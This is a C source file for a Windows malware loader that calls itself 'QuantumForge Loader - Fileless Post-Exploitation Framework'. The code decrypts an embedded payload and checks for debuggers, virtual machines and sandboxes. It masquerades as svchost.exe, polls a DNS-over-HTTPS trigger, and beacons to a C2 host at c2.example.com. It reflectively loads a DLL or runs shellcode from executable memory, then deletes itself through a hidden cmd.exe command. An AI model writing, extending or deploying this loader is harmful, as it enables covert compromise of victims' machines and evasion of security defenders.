#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <bcrypt.h>
#include <winhttp.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "junk.h"  // Generated per build
#include "anti_analysis.h"  // Enhanced anti-analysis functions
#include "qf_logging.h"  // JSON logging system

// Payload and cryptographic data
unsigned char encrypted_payload[] = "__ENCRYPTED_PAYLOAD__";
unsigned char fixed_salt[] = "__FIXED_SALT__";
unsigned char iv[] = "__IV__";
unsigned char base_key[] = "__BASE_KEY__";
size_t payload_len = sizeof(encrypted_payload);

typedef struct {
    int no_doh;
    int no_selfdelete;
    int fallback_only;
    int test_mode;
    int show_help;
    char *stage_file;
    char *doh_provider;
} config_t;

config_t config = {0, 0, 0, 0, 0, NULL, "dns.google"};

// XOR key for in-memory encryption
unsigned char xor_key = 0xAA;

int decrypt_payload(unsigned char *decrypted_payload) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    BCRYPT_KEY_HANDLE hAesKey = NULL;
    unsigned char derived_key[32];
    SecureZeroMemory(derived_key, sizeof(derived_key));
    
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (status != 0) {
        QF_LOG_ERROR("crypto", "Failed to open BCrypt SHA256 provider", NULL);
        return -1;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)base_key, sizeof(base_key) - 1, 0);
    if (status != 0) {
        QF_LOG_ERROR("crypto", "Failed to generate symmetric key", NULL);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    unsigned char prf[64] = "SHA256";
    BCRYPT_BUFFER paramBuffers[2] = {
        { sizeof(prf), BCRYPTBUFFER_DATA, prf },
        { sizeof(fixed_salt) - 1, BCRYPTBUFFER_DATA, fixed_salt }
    };
    BCRYPT_BUFFER_DESC paramList = { BCRYPTBUFFER_VERSION, 2, paramBuffers };

    ULONG derived_key_len;
    status = BCryptDeriveKey(hKey, L"HKDF", &paramList, derived_key, sizeof(derived_key), &derived_key_len, 0);
    if (status != 0) {
        QF_LOG_ERROR("crypto", "HKDF key derivation failed", NULL);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        secure_zero_memory(derived_key, sizeof(derived_key));
        return -1;
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    JUNK_ASM;

    status = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) {
        QF_LOG_ERROR("crypto", "Failed to open AES provider", NULL);
        secure_zero_memory(derived_key, sizeof(derived_key));
        return -1;
    }

    status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status != 0) {
        QF_LOG_ERROR("crypto", "Failed to set AES chaining mode", NULL);
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
        secure_zero_memory(derived_key, sizeof(derived_key));
        return -1;
    }

    status = BCryptGenerateSymmetricKey(hAesAlg, &hAesKey, NULL, 0, derived_key, sizeof(derived_key), 0);
    if (status != 0) {
        QF_LOG_ERROR("crypto", "Failed to generate AES key", NULL);
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
        secure_zero_memory(derived_key, sizeof(derived_key));
        return -1;
    }

    ULONG decrypted_len;
    status = BCryptDecrypt(hAesKey, encrypted_payload, (ULONG)payload_len, NULL, iv, sizeof(iv) - 1, decrypted_payload, (ULONG)payload_len, &decrypted_len, 0);
    
    BCryptDestroyKey(hAesKey);
    BCryptCloseAlgorithmProvider(hAesAlg, 0);
    secure_zero_memory(derived_key, sizeof(derived_key));
    
    if (status != 0) {
        QF_LOG_ERROR("crypto", "AES decryption failed", NULL);
        return -1;
    }
    
    payload_len = decrypted_len;
    return 0;
}

// XOR encrypt/decrypt in memory
void xor_memory(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// DNS-over-HTTPS C2 trigger with TXT parsing
int doh_c2_trigger() {
    if (config.no_doh) return 0;
    HINTERNET hSession = WinHttpOpen(L"QuantumLoader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return -1;

    HINTERNET hConnect = WinHttpConnect(hSession, L"dns.google", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return -1;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/resolve?name=c2.example.com&type=TXT", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return -1;
    }

    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        if (bResults) {
            DWORD dwSize, dwDownloaded;
            char *buffer = NULL;
            do {
                WinHttpQueryDataAvailable(hRequest, &dwSize);
                if (!dwSize) break;
                char *temp = realloc(buffer, dwSize + 1);
                if (!temp) {
                    free(buffer);
                    WinHttpCloseHandle(hRequest);
                    WinHttpCloseHandle(hConnect);
                    WinHttpCloseHandle(hSession);
                    return -1;
                }
                buffer = temp;
                WinHttpReadData(hRequest, buffer + dwSize - dwSize, dwSize, &dwDownloaded);
                buffer[dwSize] = '\0';
            } while (dwSize > 0);
            bResults = buffer && strstr(buffer, "\"C2_TRIGGER:1\"") != NULL;
            free(buffer);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bResults ? 0 : -1;
}

void send_beacon(unsigned char *shellcode, size_t shellcode_len) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                       WINHTTP_NO_PROXY_NAME, 
                                       WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        QF_LOG_ERROR("beacon", "Failed to open WinHTTP session", NULL);
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"c2.example.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        QF_LOG_ERROR("beacon", "Failed to connect to C2 server", NULL);
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/beacon", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        QF_LOG_ERROR("beacon", "Failed to open HTTP request", NULL);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    size_t encoded_len;
    char *base64_shellcode = base64_encode(shellcode, shellcode_len, &encoded_len);
    if (!base64_shellcode) {
        QF_LOG_ERROR("beacon", "Base64 encoding failed", NULL);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    LPCWSTR headers = L"Content-Type: application/octet-stream\r\nHost: c2.example.com\r\n";
    DWORD dwTimeout = 10000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
    
    BOOL bResults = WinHttpSendRequest(hRequest, headers, -1L, base64_shellcode, (DWORD)encoded_len, (DWORD)encoded_len, 0);
    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        if (bResults) {
            QF_LOG_SUCCESS("beacon", "C2 beacon sent successfully", NULL);
        } else {
            QF_LOG_ERROR("beacon", "Failed to receive C2 response", NULL);
        }
    } else {
        QF_LOG_ERROR("beacon", "Failed to send beacon", NULL);
    }

    secure_zero_memory(base64_shellcode, encoded_len);
    free(base64_shellcode);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// PE structures for reflective DLL loading
typedef BOOL(WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);

typedef struct {
    LPVOID address;
    LPVOID addressOfEntryPoint;
} MANUAL_MAPPING_DATA;

// Resolve imports for PE
BOOL resolve_imports(LPVOID pBaseAddress, IMAGE_NT_HEADERS *pNTHeaders) {
    IMAGE_DATA_DIRECTORY *pImportDir = &pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportDir->Size == 0) return TRUE;
    
    IMAGE_IMPORT_DESCRIPTOR *pImportDesc = (IMAGE_IMPORT_DESCRIPTOR *)((DWORD_PTR)pBaseAddress + pImportDir->VirtualAddress);
    
    while (pImportDesc->Name) {
        char *szModName = (char *)((DWORD_PTR)pBaseAddress + pImportDesc->Name);
        HMODULE hModule = LoadLibraryA(szModName);
        if (!hModule) {
            return FALSE;
        }
        
        IMAGE_THUNK_DATA *pThunkRef = NULL;
        IMAGE_THUNK_DATA *pFuncRef = NULL;
        
        if (pImportDesc->OriginalFirstThunk) {
            pThunkRef = (IMAGE_THUNK_DATA *)((DWORD_PTR)pBaseAddress + pImportDesc->OriginalFirstThunk);
            pFuncRef = (IMAGE_THUNK_DATA *)((DWORD_PTR)pBaseAddress + pImportDesc->FirstThunk);
        } else {
            pThunkRef = (IMAGE_THUNK_DATA *)((DWORD_PTR)pBaseAddress + pImportDesc->FirstThunk);
            pFuncRef = (IMAGE_THUNK_DATA *)((DWORD_PTR)pBaseAddress + pImportDesc->FirstThunk);
        }
        
        while (pThunkRef->u1.AddressOfData) {
            FARPROC pFunc = NULL;
            
            if (IMAGE_SNAP_BY_ORDINAL(pThunkRef->u1.Ordinal)) {
                pFunc = GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pThunkRef->u1.Ordinal));
            } else {
                IMAGE_IMPORT_BY_NAME *pImport = (IMAGE_IMPORT_BY_NAME *)((DWORD_PTR)pBaseAddress + pThunkRef->u1.AddressOfData);
                pFunc = GetProcAddress(hModule, pImport->Name);
            }
            
            if (!pFunc) {
                return FALSE;
            }
            
            pFuncRef->u1.Function = (DWORD_PTR)pFunc;
            pThunkRef++;
            pFuncRef++;
        }
        
        pImportDesc++;
    }
    
    return TRUE;
}

// Process relocations for PE
BOOL process_relocations(LPVOID pBaseAddress, IMAGE_NT_HEADERS *pNTHeaders, DWORD_PTR deltaImageBase) {
    IMAGE_DATA_DIRECTORY *pRelocDir = &pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (pRelocDir->Size == 0) return TRUE;
    
    IMAGE_BASE_RELOCATION *pRelocData = (IMAGE_BASE_RELOCATION *)((DWORD_PTR)pBaseAddress + pRelocDir->VirtualAddress);
    
    while (pRelocData->VirtualAddress) {
        DWORD dwNumEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *pRelocEntry = (WORD *)((DWORD_PTR)pRelocData + sizeof(IMAGE_BASE_RELOCATION));
        
        for (DWORD i = 0; i < dwNumEntries; i++) {
            WORD type = (pRelocEntry[i] >> 12) & 0xF;
            WORD offset = pRelocEntry[i] & 0xFFF;
            
            if (type == IMAGE_REL_BASED_DIR64) {
                DWORD_PTR *pPatch = (DWORD_PTR *)((DWORD_PTR)pBaseAddress + pRelocData->VirtualAddress + offset);
                *pPatch += deltaImageBase;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD *pPatch = (DWORD *)((DWORD_PTR)pBaseAddress + pRelocData->VirtualAddress + offset);
                *pPatch += (DWORD)deltaImageBase;
            } else if (type == IMAGE_REL_BASED_HIGH) {
                WORD *pPatch = (WORD *)((DWORD_PTR)pBaseAddress + pRelocData->VirtualAddress + offset);
                *pPatch += HIWORD(deltaImageBase);
            } else if (type == IMAGE_REL_BASED_LOW) {
                WORD *pPatch = (WORD *)((DWORD_PTR)pBaseAddress + pRelocData->VirtualAddress + offset);
                *pPatch += LOWORD(deltaImageBase);
            }
        }
        
        pRelocData = (IMAGE_BASE_RELOCATION *)((DWORD_PTR)pRelocData + pRelocData->SizeOfBlock);
    }
    
    return TRUE;
}

// Main reflective DLL loader
BOOL reflective_dll_load(unsigned char *pDllBuffer, size_t dllSize) {
    if (!pDllBuffer || dllSize < sizeof(IMAGE_DOS_HEADER)) {
        return FALSE;
    }
    
    IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER *)pDllBuffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    
    IMAGE_NT_HEADERS *pNTHeaders = (IMAGE_NT_HEADERS *)((DWORD_PTR)pDllBuffer + pDosHeader->e_lfanew);
    if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    
    if (pNTHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 && 
        pNTHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        return FALSE;
    }
    
    SIZE_T imageSize = pNTHeaders->OptionalHeader.SizeOfImage;
    LPVOID pImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        return FALSE;
    }
    
    memcpy(pImageBase, pDllBuffer, pNTHeaders->OptionalHeader.SizeOfHeaders);
    
    IMAGE_SECTION_HEADER *pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaders);
    for (WORD i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++, pSectionHeader++) {
        if (pSectionHeader->SizeOfRawData > 0) {
            LPVOID pSectionDest = (LPVOID)((DWORD_PTR)pImageBase + pSectionHeader->VirtualAddress);
            LPVOID pSectionSrc = (LPVOID)((DWORD_PTR)pDllBuffer + pSectionHeader->PointerToRawData);
            memcpy(pSectionDest, pSectionSrc, pSectionHeader->SizeOfRawData);
        }
    }
    
    DWORD_PTR deltaImageBase = (DWORD_PTR)pImageBase - pNTHeaders->OptionalHeader.ImageBase;
    IMAGE_NT_HEADERS *pRelocatedNTHeaders = (IMAGE_NT_HEADERS *)((DWORD_PTR)pImageBase + pDosHeader->e_lfanew);
    
    if (deltaImageBase != 0) {
        if (!process_relocations(pImageBase, pRelocatedNTHeaders, deltaImageBase)) {
            VirtualFree(pImageBase, 0, MEM_RELEASE);
            return FALSE;
        }
    }
    
    if (!resolve_imports(pImageBase, pRelocatedNTHeaders)) {
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return FALSE;
    }
    
    pSectionHeader = IMAGE_FIRST_SECTION(pRelocatedNTHeaders);
    for (WORD i = 0; i < pRelocatedNTHeaders->FileHeader.NumberOfSections; i++, pSectionHeader++) {
        if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            DWORD oldProtect;
            LPVOID pSectionAddr = (LPVOID)((DWORD_PTR)pImageBase + pSectionHeader->VirtualAddress);
            VirtualProtect(pSectionAddr, pSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READ, &oldProtect);
        } else if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) {
            DWORD oldProtect;
            LPVOID pSectionAddr = (LPVOID)((DWORD_PTR)pImageBase + pSectionHeader->VirtualAddress);
            VirtualProtect(pSectionAddr, pSectionHeader->Misc.VirtualSize, PAGE_READWRITE, &oldProtect);
        } else {
            DWORD oldProtect;
            LPVOID pSectionAddr = (LPVOID)((DWORD_PTR)pImageBase + pSectionHeader->VirtualAddress);
            VirtualProtect(pSectionAddr, pSectionHeader->Misc.VirtualSize, PAGE_READONLY, &oldProtect);
        }
    }
    
    DllEntryProc pDllEntry = (DllEntryProc)((DWORD_PTR)pImageBase + pRelocatedNTHeaders->OptionalHeader.AddressOfEntryPoint);
    if (pDllEntry) {
        BOOL result = pDllEntry((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
        if (!result) {
            VirtualFree(pImageBase, 0, MEM_RELEASE);
            return FALSE;
        }
    }
    
    SecureZeroMemory(pDllBuffer, dllSize);
    
    return TRUE;
}

// Second-stage loader with reflective DLL support
void load_second_stage(unsigned char *decrypted_payload) {
    if (!decrypted_payload) return;
    
    IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER *)decrypted_payload;
    
    if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE && payload_len > sizeof(IMAGE_DOS_HEADER)) {
        IMAGE_NT_HEADERS *pNTHeaders = (IMAGE_NT_HEADERS *)((DWORD_PTR)decrypted_payload + pDosHeader->e_lfanew);
        
        if ((DWORD_PTR)pNTHeaders < (DWORD_PTR)decrypted_payload + payload_len && 
            pNTHeaders->Signature == IMAGE_NT_SIGNATURE) {
            
            if (config.test_mode) {
                fprintf(stderr, "[*] Detected PE/DLL format - using reflective loader\n");
            }
            
            if (reflective_dll_load(decrypted_payload, payload_len)) {
                if (config.test_mode) {
                    fprintf(stderr, "[*] Reflective DLL load successful\n");
                }
                return;
            } else {
                if (config.test_mode) {
                    fprintf(stderr, "[!] Reflective DLL load failed - falling back to shellcode\n");
                }
            }
        }
    }
    
    execute_payload(decrypted_payload);
}

// Anti-debugging
BOOL is_debugger() {
    if (IsDebuggerPresent()) return TRUE;

    DWORD isDebugged = 0;
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (hNtDll) {
        typedef NTSTATUS(WINAPI* pNtQuery)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        pNtQuery NtQueryInformationProcess = (pNtQuery)GetProcAddress(hNtDll, "NtQueryInformationProcess");
        if (NtQueryInformationProcess) {
            NtQueryInformationProcess(GetCurrentProcess(), 0x07, &isDebugged, sizeof(DWORD), NULL);
            if (isDebugged) return TRUE;
        }
    }
    return FALSE;
}

// Anti-VM checks
BOOL is_vm() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 0);
    char vendor[13] = {0};
    memcpy(vendor, &cpuInfo[1], 4);
    memcpy(vendor + 4, &cpuInfo[3], 4);
    memcpy(vendor + 8, &cpuInfo[2], 4);
    if (!strcmp(vendor, "VMwareVMware") || !strcmp(vendor, "KVMKVMKVM")) return TRUE;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return sysInfo.dwNumberOfProcessors < 2;
}

// Anti-sandbox timing
BOOL is_sandbox() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(1);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    return elapsed < 0.5 || elapsed > 1.5;
}

// Masquerade process
void rename_process() {
    SetConsoleTitleA("svchost.exe");
}

// Execute shellcode
void execute_payload(unsigned char *decrypted_payload) {
    LPVOID exec_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem) {
        memcpy(exec_mem, decrypted_payload, payload_len);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    }
}

void self_delete() {
    if (config.no_selfdelete) return;
    CHAR szFileName[MAX_PATH];
    GetModuleFileNameA(NULL, szFileName, MAX_PATH);
    CHAR cmd[MAX_PATH + 50];
    sprintf(cmd, "cmd.exe /C ping 127.0.0.1 -n 2 > nul & del /f \"%s\"", szFileName);
    WinExec(cmd, SW_HIDE);
}

void print_help(const char *prog) {
    fprintf(stderr, "Usage: %s [OPTIONS]\n\n", prog);
    fprintf(stderr, "QuantumForge Loader - Fileless Post-Exploitation Framework\n\n");
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --no-doh             Disable DNS-over-HTTPS C2 trigger\n");
    fprintf(stderr, "  --no-selfdelete      Prevent loader from deleting itself\n");
    fprintf(stderr, "  --fallback-only      Offline mode (no remote retrieval)\n");
    fprintf(stderr, "  --test-mode          Enable debug output, simulate without execution\n");
    fprintf(stderr, "  --stage-file <path>  Supply local stage file for manual testing\n");
    fprintf(stderr, "  --doh-provider <dns> Custom DoH resolver (default: dns.google)\n");
    fprintf(stderr, "  --help               Show this help message\n\n");
    fprintf(stderr, "Examples:\n");
    fprintf(stderr, "  %s --test-mode --no-doh\n", prog);
    fprintf(stderr, "  %s --fallback-only --stage-file payload.bin\n", prog);
    fprintf(stderr, "  %s --doh-provider cloudflare-dns.com\n\n", prog);
}

int validate_config() {
    if (config.fallback_only && config.stage_file) {
        fprintf(stderr, "[!] Error: --fallback-only and --stage-file are mutually exclusive\n");
        return -1;
    }
    if (config.stage_file) {
        HANDLE hFile = CreateFileA(config.stage_file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "[!] Error: Cannot open stage file: %s\n", config.stage_file);
            return -1;
        }
        CloseHandle(hFile);
    }
    return 0;
}

void parse_flags(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-doh") == 0) {
            config.no_doh = 1;
        } else if (strcmp(argv[i], "--no-selfdelete") == 0) {
            config.no_selfdelete = 1;
        } else if (strcmp(argv[i], "--fallback-only") == 0) {
            config.fallback_only = 1;
        } else if (strcmp(argv[i], "--test-mode") == 0) {
            config.test_mode = 1;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            config.show_help = 1;
        } else if (strcmp(argv[i], "--stage-file") == 0) {
            if (i + 1 < argc) {
                config.stage_file = argv[++i];
            } else {
                fprintf(stderr, "[!] Error: --stage-file requires a path\n");
                return;
            }
        } else if (strcmp(argv[i], "--doh-provider") == 0) {
            if (i + 1 < argc) {
                config.doh_provider = argv[++i];
            } else {
                fprintf(stderr, "[!] Error: --doh-provider requires a DNS name\n");
                return;
            }
        } else {
            fprintf(stderr, "[!] Unknown option: %s\n", argv[i]);
            fprintf(stderr, "Use --help for usage information\n");
            return;
        }
    }
}

int main(int argc, char **argv) {
    setup_signal_handlers();
    parse_flags(argc, argv);
    
    if (config.show_help) {
        print_help(argv[0]);
        return 0;
    }
    
    if (validate_config() != 0) {
        return 1;
    }
    
    qf_logger_init("windows");
    QF_LOG_INFO("main", "QuantumForge Windows loader started", NULL);
    
    if (config.test_mode) {
        fprintf(stderr, "[*] Test mode enabled - simulation only\n");
        fprintf(stderr, "[*] Config: no_doh=%d, no_selfdelete=%d, fallback=%d\n",
                config.no_doh, config.no_selfdelete, config.fallback_only);
        QF_LOG_INFO("config", "Test mode enabled", "simulation_only");
    }
    
    rename_process();
    
    if (!config.test_mode) {
        QF_LOG_INFO("anti_analysis", "Running anti-analysis checks", NULL);
        if (check_all_anti_analysis(0)) {
            QF_LOG_ERROR("anti_analysis", "Analysis environment detected, terminating", NULL);
            qf_logger_close(1);
            return 1;
        }
        QF_LOG_SUCCESS("anti_analysis", "No threats detected", NULL);
    } else {
        fprintf(stderr, "[*] Skipping anti-analysis checks (test mode)\n");
        QF_LOG_INFO("anti_analysis", "Skipped in test mode", NULL);
    }
    
    unsigned char *decrypted_payload = (unsigned char *)malloc(payload_len);
    if (!decrypted_payload) {
        QF_LOG_ERROR("memory", "Failed to allocate payload buffer", NULL);
        qf_logger_close(1);
        return 1;
    }
    
    if (config.test_mode) {
        memset(decrypted_payload, 0, payload_len);
        fprintf(stderr, "[*] Test mode: skipping decryption\n");
    } else {
        if (decrypt_payload(decrypted_payload) != 0) {
            QF_LOG_ERROR("crypto", "Payload decryption failed", NULL);
            secure_zero_memory(decrypted_payload, payload_len);
            free(decrypted_payload);
            qf_logger_close(1);
            return 1;
        }
        xor_memory(decrypted_payload, payload_len, xor_key);
        DWORD oldProtect;
        VirtualProtect(encrypted_payload, sizeof(encrypted_payload), PAGE_NOACCESS, &oldProtect);
    }
    
    if (config.test_mode) {
        fprintf(stderr, "[*] Payload decrypted successfully (size: %zu bytes)\n", payload_len);
        fprintf(stderr, "[*] Test mode: skipping execution\n");
        char size_buf[64];
        snprintf(size_buf, sizeof(size_buf), "%zu bytes", payload_len);
        QF_LOG_SUCCESS("decrypt", "Payload decrypted successfully", size_buf);
        QF_LOG_INFO("test_mode", "Skipping execution in test mode", NULL);
        const char *log_path = qf_logger_get_path();
        if (log_path) {
            fprintf(stderr, "[*] Log file: %s\n", log_path);
        }
        secure_zero_memory(decrypted_payload, payload_len);
        free(decrypted_payload);
        qf_logger_close(0);
        return 0;
    }
    
    QF_LOG_SUCCESS("decrypt", "Payload decrypted", NULL);
    
    if (doh_c2_trigger() == 0) {
        printf("[*] C2 trigger successful\n");
        QF_LOG_SUCCESS("c2", "DoH C2 trigger successful", NULL);
    }
    
    send_beacon(decrypted_payload, payload_len);
    QF_LOG_INFO("beacon", "Beacon sent", NULL);
    
    xor_memory(decrypted_payload, payload_len, xor_key);
    self_delete();
    QF_LOG_INFO("stealth", "Self-delete executed", NULL);
    
    if (!config.fallback_only) {
        QF_LOG_INFO("execution", "Loading second stage", "reflective_dll");
        load_second_stage(decrypted_payload);
    } else {
        QF_LOG_INFO("execution", "Using fallback mode", NULL);
        execute_payload(decrypted_payload);
    }
    
    secure_zero_memory(decrypted_payload, payload_len);
    free(decrypted_payload);
    qf_logger_close(0);
    return 0;
}
